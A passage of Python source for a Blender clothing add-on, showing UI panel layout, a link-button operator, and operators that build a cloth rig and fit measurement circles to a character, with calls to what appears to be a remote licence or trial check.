                cloth_restart.prop(context.scene, "preset_materials_toggle_property", text="Materials")
            if(bpy.context.scene.cloth_type=="SKIRT"):
                cloth_restart = cloth_box.box()
                cloth_restart.scale_y = 0.3
                cloth_restart.prop(context.scene, "pleated_toggle_property", text="Pleated Skirt")
                #cloth_restart.prop(context.scene, "pleat_count", text="Pleat Count")
        
        settings_box = layout.box()
        settings_box.scale_y = 1
        settings_box.prop(context.scene, "cloth_type", text="Cloth Type ")
        
        row = settings_box.row(align=True)
        row.prop(context.scene, "character_object", text="Character ", icon='OUTLINER_OB_ARMATURE')
        row.operator("object.assign_active_object", text="", icon='EYEDROPPER')
        row2 = settings_box.row(align=True)
        row2.prop(context.scene, "cloth_object", text="Cloth ", icon='MATCLOTH')
        row2.operator("object.assign_active_object", text="", icon='EYEDROPPER')
        #cloth_box.operator("wm.save_mainfile", text="Bind", icon='MOD_SKIN')
        
#-----------------------------------------------------  SECTIONS -----------------------------------------------------#
        if(bpy.context.scene.cloth_object):
            if(bpy.context.scene.cloth_object.name in bpy.context.scene.objects):
                sections = layout.box()
            else:
                if('Cloth Rig Factory' in bpy.context.scene.objects):
                    sectionsc = layout.box()
                    sectionsc.label(text="Position the points on your Character")
                    sectionsc.label(text="Yes. Lovely")
                elif('BiceptCircle' in bpy.context.scene.objects):
                    sectionsd = layout.box()
                    sectionsd.label(text="Alright now make sure the circles hug the character")
                    sectionsd.label(text="Yes. Lovely")
                else:
                    sectionsb = layout.box()
                    sectionsb.label(text="No Divine Cloth found")
                    sectionsb.label(text="Select your Character and click 'New Cloth'")
                    sectionsb.label(text="The heavens will take care of the rest")
            
            if(bpy.context.scene.cloth_object.name in bpy.context.scene.objects):
                bind_box = sections.box()
                bind_box.scale_y = 2
                #bind_box_split = bind_box.split(factor=0.9)
                bind_box.operator("object.bind_to_character", text="Bind", icon="PINNED")
                #if(bpy.context.scene.bind_visibility_property):
                #if(get_modifier_index('SurfaceDeform') is not None):
                #    if(bpy.context.active_object.modifiers["SurfaceDeform"].show_viewport):
                #        bind_box_split.operator("object.hide_bind", text="", icon="HIDE_OFF")
                #    else:
                #        bind_box_split.operator("object.hide_bind", text="", icon="HIDE_ON")
#-----------------------------------------------------  PAINT BOX -----------------------------------------------------#
            if(bpy.context.scene.cloth_object.name in bpy.context.scene.objects):
                paint_box = sections.box()
                paint_box.scale_y = 2
                #seamtool_toggle_property
                paint_box.prop(context.scene, "paint_toggle_property", text="Paint", icon="COLORSET_09_VEC")
                if(context.scene.paint_toggle_property):
                    paint_box.scale_y = 2
                    paint_pinset = paint_box.split(factor=0.7)
                    paint_pinset.operator("object.paint_group", text="Pinning", icon='PINNED').group_name = 'Pinning'
                    paint_pinset.operator("object.paint_group", text="", icon='PINNED').group_name = 'PinSet'
                    paint_shrinkset = paint_box.split(factor=0.7)
                    paint_shrinkset.operator("object.paint_group", text="Shrinkwrap", icon='MOD_SHRINKWRAP').group_name = 'Shrinkwrap'
                    paint_shrinkset.operator("object.paint_group", text="", icon='PINNED').group_name = 'ShrinkSet'
                    paint_smoothset = paint_box.split(factor=0.7)
                    paint_smoothset.operator("object.paint_group", text="Smooth", icon='BRUSH_SMOOTH').group_name = 'Smooth'
                    paint_smoothset.operator("object.paint_group", text="", icon='PINNED').group_name = 'SmoothSet'
                    paint_refreshpressure = paint_box.split(factor=0.7)
                    paint_refreshpressure.operator("object.paint_group", text="Pressure", icon='FORCE_DRAG').group_name = 'Pressure'
                    paint_refreshpressure.operator("object.paint_group", text="", icon='FILE_REFRESH').group_name = 'PressureRefresh'
                    paint_refreshshrink = paint_box.split(factor=0.7)
                    paint_refreshshrink.operator("object.paint_group", text="Inflate/Deflate", icon='BRUSH_INFLATE').group_name = 'Shrinking'
                    paint_refreshshrink.operator("object.paint_group", text="", icon='FILE_REFRESH').group_name = 'ShrinkRefresh'
                    
                    
                    paint_refresh = paint_box.split(factor=0.7)
                    #paint_refresh.operator("object.paint_group", text="Pin & Shrink").group_name = 'PinAndShrink'
                    #paint_refresh.operator("object.paint_group", text="", icon='FILE_REFRESH').group_name = 'Refresh'
                    #paint_box.operator("object.paint_group", text="Bending", icon='BRUSH_NUDGE').group_name = 'Bending'
            

#-----------------------------------------------------  DESIGN BOX -----------------------------------------------------#
        
            if(bpy.context.scene.cloth_object.name in bpy.context.scene.objects):
                design_box = sections.box()
                design_box.scale_y = 2
                design_box.prop(context.scene, "design_toggle_property", text="Design", icon="COLORSET_04_VEC")
                if(context.scene.design_toggle_property):
                    design_box.scale_y = 2
                    #design_box.operator("object.bind_to_character", text="Bind")

                    #design_cola = design_box.split(factor=0.5)
                    #design_colb = design_box.split(factor=0.5)
                    #design_cola.prop(context.scene, "button_object", text="Button", icon='OBJECT_DATA')
                    #design_cola.operator("object.assign_active_object", text="", icon='EYEDROPPER')
                    
                    #design_colb.operator("object.assign_active_object", text="", icon='EYEDROPPER')

                    #design_colb.operator("wm.save_mainfile", text="Add Button")
                    
                    #if(bpy.context.mode == 'EDIT_MESH' and bpy.context.active_object == bpy.context.scene.cloth_object):
                    
                    
                    #mesh = bpy.context.active_object.data
                    #selected_vertices = [v for v in mesh.vertices if v.select]
                    #selected_edges = [e for e in mesh.edges if e.select]
                    #selected_faces = [f for f in mesh.polygons if f.select]
                    #if len(selected_faces) == 0 and len(selected_edges) > 1:
                    #if len(selected_faces) == 0:
                    
                    #if(bpy.context.active_object is not None):
                    #    if("Divine_T-Shirt" in bpy.context.active_object.name):
                    design_box.operator("object.add_collar", text="Add Collar", icon="SHADERFX")
                    if(bpy.context.active_object is not None):
                        if("Divine_Collar" in bpy.context.active_object.name):
                            if(bpy.context.object.modifiers["Softbody"].show_viewport == True):
                                design_box.operator("object.enable_collar", text="Deactivate Collar", icon="MATCLOTH")
                            else:
                                design_box.operator("object.enable_collar", text="Activate Collar", icon="MATCLOTH")
                    #if(bpy.context.active_object is not None):
                    #    if("Divine_T-Shirt" in bpy.context.active_object.name):
                    design_box.operator("object.add_hoodie", text="Add Hoodie", icon="SHADERFX")
                    #design_box.operator("wm.save_mainfile", text="Shrinkwrap Cuffs")
                    if(bpy.context.active_object):
                        if("Divine_Pocket" in bpy.context.active_object.name or "Divine_Decal" in bpy.context.active_object.name or "Divine_AC" in bpy.context.active_object.name or "Divine_Curve" in bpy.context.active_object.name):
                            design_box.operator("object.register_divine_object", text="Divine Accessory", icon="BLENDER")
                    
                    #design_box.prop(context.scene, "seamtool_toggle_property", text="Toggle Seams", icon="MATSPHERE")
                    design_box.operator("object.enable_collision", text="Toggle Collision", icon="PHYSICS")
                    
                    #if(bpy.context.active_object is not None):
                    #    if("Divine" in bpy.context.active_object.name):
                    if(context.scene.seamtool_toggle_property):
                        design_box.operator("object.toggle_seams", text="Toggle Seams", icon="NODE_MATERIAL")
                    else:
                        design_box.operator("object.toggle_seams", text="Toggle Seams", icon="MATSPHERE")
                    
                    design_box.operator("object.puffer", text="Puff", icon="META_DATA")
                    
                    #if("Trousers" in bpy.context.active_object.name):
                    #     design_box.operator("object.apply_form", text="Apply Form", icon="MATCLOTH")
                    if(bpy.context.mode == 'EDIT_MESH' and bpy.context.active_object == bpy.context.scene.cloth_object):
                        design_box_puffrefresh = design_box.split(factor=0.7)
                        #if(len(selected_faces) == 0):
                        design_box_puffrefresh.prop(context.scene, "puffpressure_property", text="Puff Pressure", icon="META_DATA")
                        design_box_puffrefresh.operator("object.paint_group", text="", icon='FILE_REFRESH').group_name = 'PuffRefresh'
                    zip_section = design_box.split(factor=0.5)
                    zip_section.operator("object.add_zip", text="Add Zip", icon="PARTICLE_POINT")
                    
                    zip_section.prop(context.scene, "zip_object", text="", icon="OBJECT_DATA")
                    
                    
                        
                    
                    #design_box.label(text="These features are in development and may not always work as expected" , icon="ERROR")
                    #design_box.label(text="and may not always work as expected")
    #puffpressure_property
                    #design_box.operator("wm.save_mainfile", text="Toggle Seams")
                    #design_tools_l = design_box.split(factor=0.33)
                    #design_tools_r = design_box.split(factor=0.33)
                    #design_tools_l.prop(context.scene, "seamnecktool_toggle_property", text="Neck")
                    #design_tools_l.prop(context.scene, "seamcuffstool_toggle_property", text="Cuffs")
                    #design_tools_l.prop(context.scene, "seambacktool_toggle_property", text="Back")
                    #design_tools_r.prop(context.scene, "seamcentertool_toggle_property", text="Center")
                    #design_tools_r.prop(context.scene, "seamshouldertool_toggle_property", text="Shoulder")
                    
                    
                    #design_box.operator("wm.save_mainfile", text="Bloat")
                    #design_tools_l = design_box.split(factor=0.33)
                    #design_tools_r = design_box.split(factor=0.33)
                    #design_box.prop(context.scene, "bloat_amount_property", text="Amount")
                    #design_tools_l.prop(context.scene, "bloatsleevetool_toggle_property", text="Sleeve")
                    #design_tools_l.prop(context.scene, "bloatuppersleevetool_toggle_property", text="Upper Sleeve")
                    #design_tools_r.prop(context.scene, "bloatforearmtool_toggle_property", text="Forearm")
                    #design_tools_r.prop(context.scene, "bloattoptool_toggle_property", text="Top")
                    #design_tools_r.prop(context.scene, "bloattrouserlegtool_toggle_property", text="Trouser Leg")
            


#-----------------------------------------------------  DIVINE PRESETS  BOX -----------------------------------------------------#        

            #if(bpy.context.scene.cloth_object is not None):
            if(bpy.context.scene.cloth_object.name in bpy.context.scene.objects and "Jacket" not in bpy.context.scene.cloth_object.name and "Corporate" not in bpy.context.scene.cloth_object.name and "Trousers" not in bpy.context.scene.cloth_object.name and "Blazer" not in bpy.context.scene.cloth_object.name):
                presets_box = sections.box()
                presets_box.scale_y = 2
                presets_box.prop(context.scene, "presets_toggle_property", text="Divine Presets", icon="COLORSET_06_VEC")
                if(context.scene.presets_toggle_property):
                    presets_box.scale_y = 1.5
                    if("Jacket" not in bpy.context.scene.cloth_object.name and "Corporate" not in bpy.context.scene.cloth_object.name):
                        presets_box.operator("object.turn_to_puffer_jacket", text="Turn to Puffer Jacket")
                        presets_box.operator("object.turn_to_varsity_jacket", text="Turn to Varsity Jacket")
                        presets_box.operator("object.turn_to_shirt", text="Turn to Shirt")
                        presets_box.operator("object.turn_to_suit_jacket", text="Turn to Blazer")
                        presets_split = presets_box.split(factor=0.5)
                        presets_split.prop(context.scene, "preset_open_toggle_property", text="Open")
                        presets_split.prop(context.scene, "preset_hoodie_toggle_property", text="Hoodie")
                        presets_split = presets_box.split(factor=0.5)
                        presets_split.prop(context.scene, "preset_collar_toggle_property", text="Collar")
                        presets_split.prop(context.scene, "preset_materials_toggle_property", text="Materials")
                    
#-----------------------------------------------------  DIVINE PHYSICS BOX -----------------------------------------------------#        

            if(bpy.context.scene.cloth_object.name in bpy.context.scene.objects):
                physics_box = sections.box()
                physics_box.scale_y = 1
                physics_box.prop(context.scene, "physics_toggle_property", text="Divine Physics", icon="COLORSET_13_VEC")
                if(context.scene.physics_toggle_property):
                    physics_box.prop(context.scene, "cloth_quality", text="Quality")
                    physics_box.prop(context.scene, "cloth_weight", text="Cloth Weight")
                    physics_box.prop(context.scene, "cloth_stretchiness", text="Stretchiness")
                    physics_box.prop(context.scene, "cloth_max_pressure", text="Max Pressure")
                    physics_box.prop(context.scene, "cloth_max_shrinking", text="Max Shrinking")
                    physics_box.prop(context.scene, "cloth_max_inflation", text="Max Inflation/Deflation")
                    physics_box.operator("object.set_physics", text="Apply Physics", icon="CHECKMARK")
            #if(bpy.context.scene.cloth_object.name in bpy.context.scene.objects):
            #    if("Jacket" not in bpy.context.scene.cloth_object.name):
            #        othertools_box = sections.box()
            #        othertools_box.scale_y = 1
            #    if("Jacket" not in bpy.context.scene.cloth_object.name and "Corporate" not in bpy.context.scene.cloth_object.name):
            #        othertools_box.operator("object.turn_to_puffer_jacket", text="Turn to Puffer Jacket")
            #        othertools_box.operator("object.turn_to_varsity_jacket", text="Turn to Varsity Jacket")
            #        othertools_box.operator("object.turn_to_shirt", text="Turn to Shirt")
                #othertools_box.operator("object.play_sound", text="Play Sound")
                #othertools_box.prop(context.scene, "othertools_toggle_property", text="Other Tools", icon="MODIFIER")
                #if(context.scene.othertools_toggle_property):
                    #othertools_box.operator("object.cache_to_bake", text="Current Cache to Bake")
        
        
#-----------------------------------------------------  LINK(S) -----------------------------------------------------#

        
        link_row = layout.row()
        if button_text:
            link_row.operator("object.open_url_operator", text=button_text, icon='URL')
        else:
            link_row.operator("object.open_url_operator", text="Open URL", icon='URL')


#-----------------------------------------------------  END OF PANEL -----------------------------------------------------#        
        
class OBJECT_OT_cache_to_bake(bpy.types.Operator):
    bl_idname = "object.cache_to_bake"
    bl_label = "Cache to Bake"
    def execute(self, context):
        #bpy.context.area.type='PROPERTIES'
        #bpy.context.space_data.context = 'PHYSICS'
        #bpy.context.view_layer.objects.active = bpy.context.scene.cloth_object
        #bpy.ops.ptcache.bake_from_cache()
        #bpy.context.area.type='VIEW_3D'
        return {'FINISHED'}
    


class OBJECT_OT_open_url_operator(bpy.types.Operator):
    bl_idname = "object.open_url_operator"
    bl_label = "Open URL"

    button_text_url = CrossConnection
    button_text = fetch_button_text(button_text_url)
    url: bpy.props.StringProperty(default=button_text)

    def execute(self, context):
        # Open the URL
        bpy.ops.wm.url_open(url=self.url)
        return {'FINISHED'}
    
#-----------------------------------------------------  BUILD RIG -----------------------------------------------------#
#-----------------------------------------------------  BUILD RIG -----------------------------------------------------#
#-----------------------------------------------------  BUILD RIG -----------------------------------------------------#
#-----------------------------------------------------  BUILD RIG -----------------------------------------------------#
#-----------------------------------------------------  BUILD RIG -----------------------------------------------------#
#-----------------------------------------------------  BUILD RIG -----------------------------------------------------#
#-----------------------------------------------------  BUILD RIG -----------------------------------------------------#
#-----------------------------------------------------  BUILD RIG -----------------------------------------------------#
#-----------------------------------------------------  BUILD RIG -----------------------------------------------------#
        
    
class OBJECT_OT_build_rig(bpy.types.Operator):
    bl_idname = "object.build_rig"
    bl_label = "Build Rig"

    def execute(self, context):
        if(fetch_button_text(Conscience) == None):
            bpy.ops.object.bad_connection()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Denied"):
            bpy.ops.object.trial_ended()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Granted"):
            safelanguage = bpy.context.preferences.view.language
            bpy.context.preferences.view.language = 'en_US'
            all_objects = bpy.data.objects
            for obj in all_objects:
                if '_TEXT_CIM' in obj.name or '_TAPE_CIM' in obj.name or 'Cloth Rig Factory' in obj.name or 'NeckCircle' in obj.name or 'ShoulderCircle' in obj.name or 'WaistCircle' in obj.name or 'BiceptCircle' in obj.name or 'AnkleCircle' in obj.name or 'KneeCircle' in obj.name or 'NipplePoint' in obj.name or 'ThighCircle' in obj.name or 'GroinPoint' in obj.name or 'WaistLower' in obj.name:
                    bpy.data.objects.remove(obj, do_unlink=True)
            #bpy.ops.object.play_sound(sound_name="DivineProcess.mp3")
            
            bpy.context.scene.tool_settings.transform_pivot_point = 'MEDIAN_POINT'
            bpy.context.scene.transform_orientation_slots[0].type = 'GLOBAL'
    #        if(bpy.context.active_object is not None):
    #           if(bpy.context.scene.character_object is not None):
    #                if(bpy.context.scene.character_object.name != bpy.context.active_object.name):            
    #                   bpy.context.scene.character_object = bpy.context.active_object
    #                   self.report({'ERROR'}, f"Oops, your Character '{bpy.context.scene.character_object.name}' doesn't seem to exist anymore")
    #                   return {'FINISHED'}
    #            else:
    #                bpy.context.scene.character_object = bpy.context.active_object
            if(bpy.context.active_object is not None and bpy.context.scene.character_object is None):
                bpy.context.scene.character_object = bpy.context.view_layer.objects.active
            elif(bpy.context.active_object is None and bpy.context.scene.character_object is not None and bpy.context.scene.character_object.name in bpy.data.objects):
                bpy.context.view_layer.objects.active = bpy.context.scene.character_object
            else:
                if(bpy.context.scene.character_object.name not in bpy.data.objects):
                    self.report({'ERROR'}, f"It seems your Character '{bpy.context.scene.character_object.name}' is no longer in this world")
                    return {'FINISHED'}
                #self.report({'ERROR'}, f"It seems your Character '{bpy.context.scene.character_object.name}' is no longer in this world")
                else:
                    pass
                    #self.report({'ERROR'}, f"The heavens request you first select your Character")
                    #return {'FINISHED'}
            if(bpy.context.view_layer.objects.active):
                Johnny = bpy.context.view_layer.objects.active
                for modifier in Johnny.modifiers:
                    if modifier.type == 'ARMATURE':
                        bpy.context.scene.armature_object = modifier.object
                        
                bpy.context.scene.character_object = Johnny
                #CheckForDefaultCube
                bpy.ops.object.mode_set(mode='EDIT')
                if(get_highest_vertex_index() < 9):
                    bpy.ops.object.play_sound(sound_name="waitwaitwait.mp3")
                else:
                    bpy.ops.object.play_sound(sound_name="DivineProcess.mp3")
                bpy.context.object.color = (0.317676, 0.310343, 0.302631, 1)
                safeplace = bpy.context.area.ui_type
                bpy.context.area.ui_type = 'VIEW_3D'
                bpy.context.scene.character_object.select_set(True)
                bpy.ops.object.hide_view_set(unselected=True)
                bpy.context.area.ui_type = safeplace
                bpy.ops.object.modifier_add(type='COLLISION')
                bpy.context.object.collision.damping = 1
                bpy.context.object.collision.thickness_outer = 0.001
                bpy.context.object.collision.thickness_inner = 0.001
                bpy.context.object.collision.cloth_friction = 1
            bpy.context.scene.tool_settings.vertex_group_weight = 1
            
            bpy.context.scene.tool_settings.use_proportional_edit = False
            bpy.context.scene.tool_settings.use_keyframe_insert_auto = False

            

    #--------------------------------------------------CREATE CLOTH RIG
            #if(bpy.context.scene.cloth_type == 'TOP'):
            asv = add_single_vertex
            #Add Body Joints
            add_mesh("Cloth Rig Factory")
            ry = -0.411591
            Ankle_Location = (0.091731, ry, 0.106572)
            Knee_Location = (0.083754, ry, 0.524943)
            Hip_Location = (0.065142, ry, 0.93441)
            Pelvis_Location = (0.0, ry, 0.94637)
            Nipple_Location = (0.085142, ry, 1.3795)
            Neck_Location = (0.0, ry, 1.5679)
            Chin_Location = (0.0, ry, 1.6194)
            Shoulder_Location = (0.17788, ry, 1.4795)
            Elbow_Location = (0.38673, ry, 1.2724)
            Wrist_Location = (0.57264, ry, 1.0972)
            
            if(bpy.context.scene.cloth_type == 'SKIRT'):
                asv(Ankle_Location, "Ankle")
                asv(Knee_Location, "Knee")
                asv(Hip_Location, "Hip")
                asv(Pelvis_Location, "Pelvis")
                join_vertices([0,1], new=True)
                join_vertices([1,2], new=True)
                join_vertices([2,3], new=True)
                select_vertices([0,1], deselect=True)
                bpy.ops.mesh.hide(unselected=False)
                add_text("Ankle", "Cloth Rig Factory", "Ankle")
                add_text("Knee", "Cloth Rig Factory", "Knee")
                add_text("Hip", "Cloth Rig Factory", "Hip")
                add_text("Pelvis", "Cloth Rig Factory", "Pelvis")
                AnkleText = bpy.data.objects.get("Ankle_TEXT_CIM")
                KneeText = bpy.data.objects.get("Knee_TEXT_CIM")
                AnkleText.hide_viewport = True
                KneeText.hide_viewport = True
                
                select_object("Cloth Rig Factory")
                
                safeplace = bpy.context.area.ui_type
                bpy.context.area.ui_type = 'VIEW_3D'
                bpy.ops.view3d.view_axis(type='FRONT')
                safecolour = bpy.context.space_data.shading.color_type
                safeshading = bpy.context.space_data.shading.light
                safecavity = bpy.context.space_data.shading.show_cavity
                safestudiolight = bpy.context.space_data.shading.studio_light
                safexray = bpy.context.space_data.shading.show_xray
                safeoverlays = bpy.context.space_data.overlay.show_overlays

                bpy.context.space_data.shading.type = 'SOLID'
                bpy.context.space_data.shading.color_type = 'OBJECT'
                bpy.context.space_data.shading.show_cavity = True
                bpy.context.space_data.shading.light = 'STUDIO'
                bpy.context.space_data.shading.studio_light = 'outdoor.sl'
                bpy.context.space_data.overlay.show_overlays = True
                bpy.ops.object.mode_set(mode='EDIT')
                bpy.context.object.use_mesh_mirror_x = True
                bpy.ops.mesh.select_mode(use_extend=False, use_expand=False, type='VERT')
                scale_to_match_dimensions()
                bpy.ops.object.mode_set(mode='EDIT')
                
                bpy.context.preferences.view.language = safelanguage
                bpy.ops.ed.undo_push(message="Start Divine")
                
                return {'FINISHED'}
            asv(Ankle_Location, "Ankle")
            asv(Knee_Location, "Knee")
            asv(Hip_Location, "Hip")
            asv(Pelvis_Location, "Pelvis")
            if(bpy.context.scene.cloth_type == 'TOP'):
                asv(Nipple_Location, "Nipple")
                asv(Neck_Location, "Neck")
                asv(Chin_Location, "Chin")
                asv(Shoulder_Location, "Shoulder")
                asv(Elbow_Location, "Elbow")
                asv(Wrist_Location, "Wrist")
            add_text("Ankle", "Cloth Rig Factory", "Ankle")
            add_text("Knee", "Cloth Rig Factory", "Knee")
            add_text("Hip", "Cloth Rig Factory", "Hip")
            add_text("Pelvis", "Cloth Rig Factory", "Pelvis")
            if(bpy.context.scene.cloth_type == 'TOP'):
                AnkleText = bpy.data.objects.get("Ankle_TEXT_CIM")
                KneeText = bpy.data.objects.get("Knee_TEXT_CIM")
                HipText = bpy.data.objects.get("Hip_TEXT_CIM")
                AnkleText.hide_viewport = True
                KneeText.hide_viewport = True
                HipText.hide_viewport = True
            if(bpy.context.scene.cloth_type == 'TOP'):
                add_text("Nipple", "Cloth Rig Factory", "Nipple")
                add_text("Neck", "Cloth Rig Factory", "Neck")
                add_text("Chin", "Cloth Rig Factory", "Chin")
                add_text("Shoulder", "Cloth Rig Factory", "Shoulder")
                add_text("Elbow", "Cloth Rig Factory", "Elbow")
                add_text("Wrist", "Cloth Rig Factory", "Wrist")
            select_object("Cloth Rig Factory")
            join_vertices([0,1], new=True)
            join_vertices([1,2], new=True)
            join_vertices([2,3], new=True)
            if(bpy.context.scene.cloth_type == 'TOP'):
                join_vertices([3,5], new=True)
                join_vertices([5,6], new=True)
                join_vertices([5,4], new=True)
                join_vertices([5,7], new=True)
                join_vertices([7,8], new=True)
                join_vertices([8,9], new=True)
                select_vertices([0,1,2], deselect=True)
                bpy.ops.mesh.hide(unselected=False)
            safeplace = bpy.context.area.ui_type
            bpy.context.area.ui_type = 'VIEW_3D'
            bpy.ops.view3d.view_axis(type='FRONT')
            safecolour = bpy.context.space_data.shading.color_type
            safeshading = bpy.context.space_data.shading.light
            safecavity = bpy.context.space_data.shading.show_cavity
            safestudiolight = bpy.context.space_data.shading.studio_light
            safexray = bpy.context.space_data.shading.show_xray
            safeoverlays = bpy.context.space_data.overlay.show_overlays

            bpy.context.space_data.shading.type = 'SOLID'
            bpy.context.space_data.shading.color_type = 'OBJECT'
            bpy.context.space_data.shading.show_cavity = True
            bpy.context.space_data.shading.light = 'STUDIO'
            bpy.context.space_data.shading.studio_light = 'outdoor.sl'
            bpy.context.space_data.overlay.show_overlays = True
            bpy.ops.object.mode_set(mode='EDIT')
            bpy.context.object.use_mesh_mirror_x = True
            bpy.ops.mesh.select_mode(use_extend=False, use_expand=False, type='VERT')
            scale_to_match_dimensions()
            bpy.ops.object.mode_set(mode='EDIT')
            
            bpy.context.preferences.view.language = safelanguage
            bpy.ops.ed.undo_push(message="Start Divine")
            
            return {'FINISHED'}

#-----------------------------------------------------  GENERATE RIG -----------------------------------------------------#
#-----------------------------------------------------  GENERATE RIG -----------------------------------------------------#
#-----------------------------------------------------  GENERATE RIG -----------------------------------------------------#
#-----------------------------------------------------  GENERATE RIG -----------------------------------------------------#
#-----------------------------------------------------  GENERATE RIG -----------------------------------------------------#
#-----------------------------------------------------  GENERATE RIG -----------------------------------------------------#
#-----------------------------------------------------  GENERATE RIG -----------------------------------------------------#
#-----------------------------------------------------  GENERATE RIG -----------------------------------------------------#
#-----------------------------------------------------  GENERATE RIG -----------------------------------------------------#


class OBJECT_OT_generate_rig(bpy.types.Operator):
    bl_idname = "object.generate_rig"
    bl_label = "Generate Rig"

    def execute(self, context):
        if(fetch_button_text(Conscience) == None):
            bpy.ops.object.bad_connection()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Denied"):
            bpy.ops.object.trial_ended()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Granted"):
            safelanguage = bpy.context.preferences.view.language
            bpy.context.preferences.view.language = 'en_US'
            bpy.context.scene.tool_settings.transform_pivot_point = 'MEDIAN_POINT'
            bpy.context.scene.transform_orientation_slots[0].type = 'GLOBAL'
            
            bpy.context.scene.tool_settings.vertex_group_weight = 1

            #if(bpy.context.view_layer.objects.active):
            #    Johnny = bpy.context.view_layer.objects.active
            #else:
            #    print("Sorry Charlie, you need to have Johnny Selected")
                    
            if(bpy.context.mode != 'OBJECT'):
                bpy.ops.object.mode_set(mode='OBJECT')
            if(bpy.context.scene.character_object):
                #Sorting out hidden elements
                if(bpy.context.scene.cloth_type == 'TOP'):
                    AnkleText = bpy.data.objects.get("Ankle_TEXT_CIM")
                    KneeText = bpy.data.objects.get("Ankle_TEXT_CIM")
                    HipText = bpy.data.objects.get("Ankle_TEXT_CIM")
                    AnkleText.hide_viewport = False
                    KneeText.hide_viewport = False
                    HipText.hide_viewport = False
                #Add Waistline
                select_object("Pelvis_TEXT_CIM", cursor_snap=True)
                waist_width = find_size(along_x=True, width_factor=(distance_between_objects("Pelvis_TEXT_CIM","Hip_TEXT_CIM")*2), tape_name="Waist")
                waist_depth = find_size(along_y=True, tape_name="Waist")
                waist_radius = (max(waist_width, waist_depth))*1.5
                if(waist_radius < distance_between_objects("Pelvis_TEXT_CIM","Hip_TEXT_CIM") or waist_radius > distance_between_objects("Pelvis_TEXT_CIM","Hip_TEXT_CIM")*2.5):
                    waist_radius = distance_between_objects("Pelvis_TEXT_CIM","Hip_TEXT_CIM")*2.5
                    print("waist didnt calculate properly. Just kinda guessed a value. You're welcome")
                bpy.ops.mesh.primitive_circle_add(vertices=12, radius=waist_radius)
                bpy.context.active_object.name = 'WaistCircle'
                bpy.ops.object.constraint_add(type='LIMIT_ROTATION')
                bpy.context.object.constraints["Limit Rotation"].use_limit_y = True
                bpy.context.object.constraints["Limit Rotation"].use_limit_z = True
                bpy.ops.object.constraint_add(type='LIMIT_LOCATION')
                bpy.context.object.constraints["Limit Location"].use_min_x = True
                bpy.context.object.constraints["Limit Location"].use_max_x = True
                WaistCircle = bpy.data.objects.get("WaistCircle")
                group_vertices()
                bpy.context.object.show_name = True
                spin(WaistCircle, -0.023599, 0)
                
            #Add Nipple
                select_object("Nipple_TEXT_CIM", cursor_snap=True, deselect=True)
                Nipple_Point = find_size(along_y=True, center=False, tape_name="Nipple")
                select_object("Nipple_Y_TAPE_CIM", cursor_snap=True, deselect=True)
                find_extreme_vertex(bpy.data.objects.get("Nipple_Y_TAPE_CIM"), "Y", 'min', delete=True)
                bpy.context.object.name = "NipplePoint"
                
            #Add Shoulder
                select_object("Shoulder_TEXT_CIM", cursor_snap=True, deselect=True)
                shoulder_width = find_size(along_y=True, tape_name="Shoulder")
                print("Shoulder : "+str(shoulder_width))
                bpy.ops.mesh.primitive_circle_add(vertices=12, radius=shoulder_width*1.5)
                bpy.context.active_object.name = 'ShoulderCircle'
                bpy.ops.object.constraint_add(type='LIMIT_ROTATION')
                bpy.context.object.constraints["Limit Rotation"].use_limit_x = True
                bpy.context.object.constraints["Limit Rotation"].use_limit_z = True
                bpy.context.object.constraints["Limit Rotation"].use_limit_y = True
                bpy.context.object.constraints["Limit Rotation"].max_y = 3.14159
                ShoulderCircle = bpy.data.objects.get("ShoulderCircle")
                group_vertices()
                bpy.context.object.show_name = True
                
            #Add Bicept
                select_object("Shoulder_TEXT_CIM", cursor_snap=True, deselect=True)
                select_object("Elbow_TEXT_CIM", cursor_snap=True, deselect=False, center_cursor=True)
                bicept_width = find_size(along_y=True, tape_name="Bicept")
                print("Bicept : "+str(bicept_width))
                bpy.ops.mesh.primitive_circle_add(vertices=12, radius=bicept_width + 0.03)
                bpy.context.active_object.name = 'BiceptCircle'
                bpy.ops.object.constraint_add(type='LIMIT_ROTATION')
                bpy.context.object.constraints["Limit Rotation"].use_limit_x = True
                bpy.context.object.constraints["Limit Rotation"].use_limit_z = True
                bpy.context.object.constraints["Limit Rotation"].use_limit_y = True
                bpy.context.object.constraints["Limit Rotation"].min_y = 0.174533
                bpy.context.object.constraints["Limit Rotation"].max_y = 3.14159
                BiceptCircle = bpy.data.objects.get("BiceptCircle")
                group_vertices()
                bpy.context.object.show_name = True
                armpit = angle_at_point_A(ShoulderCircle.location, BiceptCircle.location)
                spin(ShoulderCircle, (armpit + 3.14159 - 0.8145), 1)
                spin(BiceptCircle, (armpit + 3.14159), 1)
                
            #Add Neck
                neck_width_factor = (distance_between_objects("Chin_TEXT_CIM","Neck_TEXT_CIM"))
                select_object("Neck_TEXT_CIM", cursor_snap=True, deselect=True)
                neck_width = max(find_size(along_y=True,center=True, tape_name="Neck"),find_size(along_x=True,center=True,width_factor=neck_width_factor, tape_name="Neck"))
                print("Neck : "+str(neck_width))
                if(neck_width < distance_between_objects("Chin_TEXT_CIM","Neck_TEXT_CIM") or neck_width > distance_between_objects("Chin_TEXT_CIM","Neck_TEXT_CIM")*3):
                    neck_width = distance_between_objects("Chin_TEXT_CIM","Neck_TEXT_CIM") * 2
                    print("Neck was too wide. Made it smaller. You're welcome")
                bpy.ops.mesh.primitive_circle_add(vertices=12, radius=neck_width + 0.02)
                set_rotation(bpy.context.active_object, (0,0,0), (10,0,0))
                bpy.context.active_object.name = 'NeckCircle'
                bpy.ops.object.constraint_add(type='LIMIT_ROTATION')
                bpy.context.object.constraints["Limit Rotation"].use_limit_y = True
                bpy.context.object.constraints["Limit Rotation"].use_limit_z = True
                bpy.ops.object.constraint_add(type='LIMIT_LOCATION')
                bpy.context.object.constraints["Limit Location"].use_min_x = True
                bpy.context.object.constraints["Limit Location"].use_max_x = True
                NeckCircle = bpy.data.objects.get("NeckCircle")
                group_vertices()
                bpy.context.object.show_name = True

                
            #Add Ankle Cuffs
                select_object("Ankle_TEXT_CIM", cursor_snap=True, deselect=True)
                ankle_width = find_size(along_y=True,center=False, tape_name="Ankle")
                print("Ankle : "+str(neck_width))
                bpy.ops.mesh.primitive_circle_add(vertices=12, radius=ankle_width)
                bpy.context.active_object.name = 'AnkleCircle'
                bpy.ops.object.constraint_add(type='LIMIT_ROTATION')
